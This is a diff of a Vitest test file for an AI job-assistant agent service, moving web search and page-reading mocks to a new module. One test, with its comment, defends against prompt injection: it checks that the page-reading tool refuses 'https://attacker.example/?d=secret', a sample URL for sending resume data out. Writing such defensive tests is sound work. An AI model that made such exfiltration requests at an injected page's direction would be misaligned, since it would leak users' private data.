@@ -186,14 +186,12 @@ vi.mock("../billing/metered-ai", () => ({
 vi.mock("../ai-providers/service", () => ({
 	aiProvidersService: aiProvidersServiceMock,
 }));
-vi.mock("../web-access/credentials", () => ({
-	webAccessService: { resolve: vi.fn(async () => null), canSearch: vi.fn(() => false) },
-}));
-vi.mock("../web-access/service", () => ({
+vi.mock("../web/service", () => ({
+	canSearchWeb: vi.fn(() => false),
 	searchWeb: vi.fn(),
 	readPage: vi.fn(),
 }));
-vi.mock("../web-access/regions", () => ({
+vi.mock("../jobs/regions", () => ({
 	searchScope: vi.fn(async () => ({ regions: ["DE", "FR"], locations: ["Berlin"] })),
 }));
 vi.mock("../resume/service", () => ({ resumeService: resumeServiceMock }));
@@ -478,12 +476,11 @@ describe("agentService.messages.send", () => {
 		expect(documentMock.findPosting).toHaveBeenCalledTimes(1);
 
 		// The assistant's web search targets the user's countries and keeps the query as written.
-		const { searchWeb } = await import("../web-access/service");
+		const { searchWeb } = await import("../web/service");
 		vi.mocked(searchWeb).mockResolvedValue([]);
 		const signal = new AbortController().signal;
 		await vi.mocked(buildAgentTools).mock.calls[0]?.[0].handlers.searchWeb("designer", signal);
 		expect(searchWeb).toHaveBeenCalledWith("designer", {
-			connection: null,
 			userId: "user-1",
 			signal,
 			regions: ["DE", "FR"],
@@ -491,18 +488,17 @@ describe("agentService.messages.send", () => {
 
 		// A document thread reads only pages the user linked or a search found, so injected text can't make the model
 		// request an address of its own with resume data in it.
-		const { readPage } = await import("../web-access/service");
+		const { readPage, canSearchWeb } = await import("../web/service");
 		await expect(
 			vi.mocked(buildAgentTools).mock.calls[0]?.[0].handlers.readPage("https://attacker.example/?d=secret", signal),
 		).rejects.toThrow("Read only retrieved URLs");
 		expect(readPage).not.toHaveBeenCalled();
 
-		// The server's SearXNG gives the assistant web search without a web connection.
+		// Web search is offered once the server can search through treg; the person sets nothing up.
 		expect(vi.mocked(buildAgentTools).mock.calls[0]?.[0]).toMatchObject({ externalSearch: false });
-		const { webAccessService } = await import("../web-access/credentials");
-		vi.mocked(webAccessService.canSearch).mockReturnValueOnce(true);
+		vi.mocked(canSearchWeb).mockReturnValueOnce(true);
 		await send();
-		expect(webAccessService.canSearch).toHaveBeenLastCalledWith(false);
+		expect(canSearchWeb).toHaveBeenCalled();
 		expect(vi.mocked(buildAgentTools).mock.calls[2]?.[0]).toMatchObject({ externalSearch: true });
 
 		// A link the user wrote still reads, however the sentence around it ends or the model spells it.
@@ -626,8 +622,8 @@ describe("agentService.messages.send", () => {
 		});
 		const [{ convertToModelMessages, ToolLoopAgent }, { agentStreamLifecycle }, { buildAgentTools }, { agentService }] =
 			await Promise.all([import("ai"), import("./streams"), import("./tools"), import("./service")]);
-		const { webAccessService } = await import("../web-access/credentials");
-		vi.mocked(webAccessService.canSearch).mockReturnValueOnce(true);
+		const { canSearchWeb } = await import("../web/service");
+		vi.mocked(canSearchWeb).mockReturnValueOnce(true);
 		vi.mocked(convertToModelMessages).mockResolvedValue([]);
 		class MockToolLoopAgent {
 			stream = vi.fn(async () => ({ toUIMessageStream: vi.fn(() => new ReadableStream()) }));
